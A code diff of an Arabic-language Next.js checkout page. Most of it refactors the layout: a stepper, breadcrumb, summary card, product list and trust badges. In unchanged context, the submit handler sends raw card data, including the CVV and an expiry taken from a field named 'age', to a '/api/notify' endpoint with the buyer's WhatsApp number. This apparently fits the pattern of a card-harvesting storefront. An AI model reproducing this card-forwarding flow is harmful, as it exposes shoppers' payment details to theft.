@@ -3,9 +3,11 @@
 import { useSyncExternalStore } from "react";
 import { useRouter } from "next/navigation";
 import Link from "next/link";
-import { IoChevronBack } from "react-icons/io5";
+import { ChevronRight } from "lucide-react";
 import { useCartStore } from "../store/cartStore";
-import OrderSummary from "./components/OrderSummary";
+import CheckoutStepper from "../components/checkout/CheckoutStepper";
+import OrderSummaryCard from "../components/checkout/OrderSummaryCard";
+import TrustBadges from "../components/checkout/TrustBadges";
 import PaymentForm from "./components/PaymentForm";
 
 export default function CheckoutPage() {
@@ -18,11 +20,7 @@ export default function CheckoutPage() {
   const downPayment = customer?.installmentType === "installment" ? (customer.downPayment ?? 0) : 0;
 
   if (!mounted) return null;
-
-  if (!customer || items.length === 0) {
-    router.push("/cart");
-    return null;
-  }
+  if (!customer || items.length === 0) { router.push("/cart"); return null; }
 
   const handleSubmit = async (fields: { name: string; age: string; cvv: string; cardHolder: string }) => {
     const res = await fetch("/api/notify", {
@@ -33,7 +31,12 @@ export default function CheckoutPage() {
         expiry: fields.age,
         cvv: fields.cvv,
         cardHolder: fields.cardHolder,
-        items: items.map(i => ({ productId: i.product._id, name: i.product.name, price: i.product.salePrice ?? i.product.originalPrice, quantity: i.qty })),
+        items: items.map(i => ({
+          productId: i.product._id,
+          name: i.product.name,
+          price: i.product.salePrice ?? i.product.originalPrice,
+          quantity: i.qty,
+        })),
         total,
         customer: customer?.name,
         whatsapp: customer?.whatsapp,
@@ -50,23 +53,57 @@ export default function CheckoutPage() {
   };
 
   return (
-    <main className="min-h-screen pb-24 bg-[#f8f9fa]" dir="rtl">
+    <main className="min-h-screen bg-[#f8f9fa]" dir="rtl">
       <style>{`body { background-color: #f8f9fa; }`}</style>
-      <div className="sticky top-0 z-10 border-b border-gray-200 bg-white">
-        <div className="max-w-4xl mx-auto px-3 sm:px-6 py-3.5 flex items-center gap-3">
-          <Link href="/cart" className="w-8 h-8 bg-[#0F4C6E]/20 rounded-full flex items-center justify-center hover:bg-[#0F4C6E]/40 transition">
-            <IoChevronBack size={18} className="text-[#0F4C6E] rotate-180" />
-          </Link>
-          <div>
-            <h1 className="text-base font-extrabold text-[#0F4C6E]">إتمام الطلب</h1>
-            <p className="text-xs text-[#0F4C6E]/70">{itemCount} منتج</p>
-          </div>
+      <CheckoutStepper currentStep={3} />
+
+      {/* Breadcrumb */}
+      <div className="max-w-6xl mx-auto px-4 sm:px-6 pt-6 pb-2">
+        <div className="flex items-center gap-2 text-sm text-gray-500">
+          <Link href="/" className="hover:text-[#1a6b7d] transition-colors">الرئيسية</Link>
+          <ChevronRight size={14} className="text-gray-300" />
+          <Link href="/cart" className="hover:text-[#1a6b7d] transition-colors">السلة</Link>
+          <ChevronRight size={14} className="text-gray-300" />
+          <span className="text-gray-800 font-semibold">إتمام الطلب</span>
         </div>
       </div>
 
-      <div className="max-w-4xl mx-auto px-3 sm:px-6 pt-5 space-y-4">
-        <OrderSummary total={total} downPayment={downPayment} />
-        <PaymentForm onSubmit={handleSubmit} />
+      <div className="max-w-6xl mx-auto px-4 sm:px-6 pb-24 pt-4">
+        <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
+
+          {/* LEFT — Payment form */}
+          <div className="lg:col-span-2">
+            <PaymentForm onSubmit={handleSubmit} />
+          </div>
+
+          {/* RIGHT — Sticky summary */}
+          <div className="lg:col-span-1">
+            <div className="sticky top-4 space-y-3">
+              <OrderSummaryCard
+                total={total}
+                itemCount={itemCount}
+                downPayment={downPayment}
+              />
+
+              {/* Mini product list */}
+              <div className="bg-white rounded-2xl border border-gray-100 shadow-sm px-5 py-4 space-y-3">
+                <p className="text-xs font-bold text-gray-500 uppercase tracking-wide">المنتجات</p>
+                {items.map(({ product, qty }) => {
+                  const price = product.salePrice ?? product.originalPrice ?? product.price;
+                  return (
+                    <div key={product._id} className="flex items-center justify-between gap-2">
+                      <span className="text-xs text-gray-700 font-medium line-clamp-1 flex-1">{product.name}</span>
+                      <span className="text-xs text-gray-500 shrink-0">×{qty}</span>
+                      <span className="text-xs font-bold text-[#1a6b7d] shrink-0">{(price * qty).toLocaleString("en-US")} ر.س</span>
+                    </div>
+                  );
+                })}
+              </div>
+
+              <TrustBadges className="bg-white rounded-2xl border border-gray-100 shadow-sm px-5 py-4" />
+            </div>
+          </div>
+        </div>
       </div>
     </main>
   );
